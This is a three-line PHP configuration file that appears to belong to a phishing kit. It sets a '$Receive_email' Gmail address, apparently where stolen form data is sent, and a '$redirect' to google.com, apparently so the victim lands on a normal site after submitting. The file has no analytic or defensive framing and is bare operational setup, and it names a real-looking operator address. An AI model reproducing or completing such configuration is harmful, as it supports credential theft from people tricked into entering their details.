<?php 
$Receive_email="armyofabundance99@gmail.com";
$redirect="https://www.google.com/";
?>